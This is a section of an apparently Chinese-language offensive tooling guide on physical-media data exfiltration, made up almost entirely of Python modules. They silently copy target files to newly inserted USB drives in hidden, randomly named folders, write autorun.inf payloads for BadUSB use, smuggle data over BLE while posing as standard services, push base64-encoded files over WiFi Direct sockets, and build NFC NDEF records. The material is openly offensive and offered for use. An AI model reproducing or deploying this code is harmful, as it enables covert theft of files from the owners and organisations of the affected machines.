## §4: 物理介质外泄技术 (Physical Media Exfiltration)

### 4.1 USB数据外泄

```python
#!/usr/bin/env python3
"""
USB数据外泄模块
利用USB大容量存储设备进行数据外泄
策略：自动检测、自动复制、文件隐藏
"""

import os
import shutil
import time
import threading
import subprocess
import random
from typing import List, Optional
from pathlib import Path

class USBExfiltrator:
    """USB数据外泄器"""

    # 常见的USB挂载点
    MOUNT_PATHS = [
        "/media/",
        "/mnt/",
        "/Volumes/",  # macOS
        "/run/media/",  # Linux (systemd)
    ]

    def __init__(self, target_paths: List[str], exfil_filter: str = "*"):
        self.target_paths = target_paths
        self.exfil_filter = exfil_filter
        self.running = False
        self.monitor_thread = None

    def _detect_usb_devices(self) -> List[str]:
        """检测已连接的USB设备"""
        usb_devices = []

        for mount_path in self.MOUNT_PATHS:
            if os.path.exists(mount_path):
                for item in os.listdir(mount_path):
                    full_path = os.path.join(mount_path, item)
                    if os.path.ismount(full_path) or os.path.isdir(full_path):
                        usb_devices.append(full_path)

        return usb_devices

    def _copy_files_to_usb(self, usb_path: str, hidden: bool = True) -> int:
        """复制文件到USB设备"""
        total_copied = 0
        exfil_dir = os.path.join(usb_path, f".system_cache_{random.randint(1000, 9999)}")

        if hidden:
            exfil_dir = os.path.join(usb_path, f".{random.choice(['cache', 'tmp', 'data', 'log'])}")
        else:
            exfil_dir = os.path.join(usb_path, f"backup_{random.randint(100, 999)}")

        os.makedirs(exfil_dir, exist_ok=True)

        for target_path in self.target_paths:
            if os.path.isfile(target_path):
                try:
                    shutil.copy2(target_path, exfil_dir)
                    total_copied += 1
                except Exception:
                    pass
            elif os.path.isdir(target_path):
                try:
                    dest = os.path.join(exfil_dir, os.path.basename(target_path))
                    shutil.copytree(target_path, dest)
                    total_copied += 1
                except Exception:
                    pass

        return total_copied

    def _create_autorun(self, usb_path: str, payload: str) -> bool:
        """创建自动运行脚本 (用于USB Rubber Ducky等)"""
        # 注意：现代系统中autorun.inf通常被禁用
        # 但可以用于BadUSB场景
        autorun_content = f"""
[AutoRun]
open={payload}
action=Open folder to view files
icon=shell32.dll,4
label=USB Drive
"""

        try:
            with open(os.path.join(usb_path, "autorun.inf"), "w") as f:
                f.write(autorun_content)
            return True
        except Exception:
            return False

    def start_monitoring(self, interval: int = 5):
        """启动USB监控"""
        self.running = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, args=(interval,))
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        print("[*] USB监控已启动")

    def _monitor_loop(self, interval: int):
        """USB监控循环"""
        known_devices = set()

        while self.running:
            current_devices = set(self._detect_usb_devices())
            new_devices = current_devices - known_devices

            for device in new_devices:
                print(f"[+] 检测到新USB设备: {device}")
                copied = self._copy_files_to_usb(device)
                print(f"[+] 已复制 {copied} 个文件到 {device}")

            known_devices = current_devices
            time.sleep(interval)

    def stop_monitoring(self):
        """停止监控"""
        self.running = False
        if self.monitor_thread:
            self.monitor_thread.join()

    def exfiltrate_to_device(self, device_path: str) -> int:
        """手动外泄到指定设备"""
        return self._copy_files_to_usb(device_path)

    def exfiltrate_as_zip(self, usb_path: str, zip_name: str = None) -> bool:
        """将数据压缩后外泄到USB"""
        if zip_name is None:
            zip_name = f"cache_{random.randint(1000, 9999)}.zip"

        zip_path = os.path.join(usb_path, zip_name)

        try:
            import zipfile
            import tempfile

            # 先在临时目录创建
            with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
                tmp_path = tmp.name

            with zipfile.ZipFile(tmp_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for target in self.target_paths:
                    if os.path.isfile(target):
                        zf.write(target, os.path.basename(target))
                    elif os.path.isdir(target):
                        for root, _, files in os.walk(target):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, os.path.dirname(target))
                                zf.write(file_path, arcname)

            # 复制到USB
            shutil.move(tmp_path, zip_path)
            print(f"[+] ZIP外泄完成: {zip_path}")
            return True

        except Exception as e:
            print(f"[!] ZIP外泄失败: {e}")
            return False
```

### 4.2 蓝牙外泄 (BLE Exfiltration)

```python
#!/usr/bin/env python3
"""
蓝牙/BLE外泄模块
利用蓝牙低功耗(BLE)进行数据外泄
策略：BLE广播包、GATT特征值、蓝牙经典RFCOMM
"""

import asyncio
import struct
import time
import random
import base64
from bleak import BleakScanner, BleakClient
from typing import Optional, List

class BLEExfiltrator:
    """BLE外泄器"""

    # BLE广播包最大payload: 31 bytes
    ADVERTISING_MAX_PAYLOAD = 31

    # UUID伪装
    SERVICE_UUIDS = [
        "0000180a-0000-1000-8000-00805f9b34fb",  # Device Information
        "0000180f-0000-1000-8000-00805f9b34fb",  # Battery Service
        "0000180d-0000-1000-8000-00805f9b34fb",  # Heart Rate
        "00001819-0000-1000-8000-00805f9b34fb",  # Location and Navigation
    ]

    def __init__(self, device_name: str = "BLE-Sensor"):
        self.device_name = device_name
        self.advertising_data = bytearray()

    def _encode_for_advertising(self, data: bytes) -> bytes:
        """将数据编码到BLE广播包中"""
        # BLE广播包格式: [Length, AD Type, AD Data]
        # 使用Manufacturer Specific Data (AD Type 0xFF)
        encoded = bytearray()

        # 伪装为制造商数据
        company_id = struct.pack("<H", random.randint(0x0001, 0xFFFF))
        ad_data = company_id + data

        # 每个AD结构最大31字节
        max_ad_data = self.ADVERTISING_MAX_PAYLOAD - 2  # 减去Length和Type
        chunks = [ad_data[i:i + max_ad_data] for i in range(0, len(ad_data), max_ad_data)]

        return chunks[0] if chunks else b""

    async def exfiltrate_via_advertising(self, data: bytes) -> bool:
        """通过BLE广播包外泄"""
        encoded = self._encode_for_advertising(data)

        # 在实际部署中，这里会使用BLE广播API
        # 此处展示payload构造逻辑
        ad_payload = struct.pack(
            "BB",
            len(encoded) + 1,  # Length
            0xFF,               # Manufacturer Specific Data
        ) + encoded

        print(f"[*] BLE广播payload: {len(ad_payload)} bytes")
        print(f"[*] 伪装为设备: {self.device_name}")
        return True

    async def exfiltrate_via_gatt(self, target_address: str, data: bytes) -> bool:
        """通过GATT特征值外泄"""
        try:
            async with BleakClient(target_address) as client:
                # 伪装为写入特征值
                service_uuid = random.choice(self.SERVICE_UUIDS)
                char_uuid = "00002a00-0000-1000-8000-00805f9b34fb"  # Device Name

                # 分块写入
                chunk_size = 20  # BLE默认MTU
                chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

                for idx, chunk in enumerate(chunks):
                    try:
                        await client.write_gatt_char(char_uuid, chunk, response=True)
                        if idx % 10 == 0:
                            print(f"[+] GATT chunk {idx + 1}/{len(chunks)}")
                        await asyncio.sleep(0.01)
                    except Exception:
                        pass

                return True

        except Exception as e:
            print(f"[!] GATT外泄失败: {e}")
            return False
```

### 4.3 WiFi Direct / NFC外泄

```python
#!/usr/bin/env python3
"""
WiFi Direct / NFC外泄模块
利用WiFi Direct P2P或NFC进行近距离数据外泄
"""

import socket
import threading
import os
import time
import random
import base64
import hashlib
from typing import Optional

class WiFiDirectExfil:
    """WiFi Direct外泄器"""

    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.server = None
        self.running = False

    def start_p2p_server(self, port: int = 8888):
        """启动P2P服务器"""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(("0.0.0.0", port))
        self.server.listen(1)
        self.running = True

        print(f"[*] WiFi Direct P2P服务器: 0.0.0.0:{port}")

        while self.running:
            try:
                client, addr = self.server.accept()
                print(f"[+] P2P连接: {addr}")

                data = client.recv(65536)
                if data:
                    # 处理接收到的数据 (外泄内容)
                    pass

                client.close()
            except Exception:
                continue

    def exfiltrate_via_wifi_direct(self, target_ip: str, port: int, file_path: str) -> bool:
        """通过WiFi Direct外泄文件"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)

        try:
            sock.connect((target_ip, port))

            with open(file_path, "rb") as f:
                data = f.read()

            encoded = base64.b64encode(data)
            sock.send(encoded)
            sock.close()

            print(f"[+] WiFi Direct外泄完成: {len(data)} bytes")
            return True

        except Exception as e:
            print(f"[!] WiFi Direct外泄失败: {e}")
            return False

class NFCExfil:
    """NFC外泄器 (模拟NDEF消息构造)"""

    @staticmethod
    def build_ndef_text_record(text: str) -> bytes:
        """构建NDEF文本记录"""
        lang_code = "en"
        lang_len = len(lang_code)
        text_bytes = text.encode("utf-8")
        text_len = len(text_bytes)

        payload = bytearray()
        payload.append(lang_len)
        payload.extend(lang_code.encode("ascii"))
        payload.extend(text_bytes)

        # NDEF Header
        tnf = 0x01  # NFC Forum well-known type
        record_type = b"T"  # Text record

        header = bytearray()
        header.append(0xD1)  # MB=1, ME=1, TNF=0x01
        header.append(len(record_type))
        header.append(len(payload))
        header.extend(record_type)
        header.extend(payload)

        return bytes(header)

    @staticmethod
    def build_ndef_uri_record(uri: str) -> bytes:
        """构建NDEF URI记录"""
        uri_bytes = uri.encode("utf-8")

        payload = bytearray()
        payload.append(0x00)  # No prefix
        payload.extend(uri_bytes)

        header = bytearray()
        header.append(0xD1)
        header.append(1)  # Type length
        header.append(len(payload))
        header.append(0x55)  # 'U' for URI
        header.extend(payload)

        return bytes(header)
```---

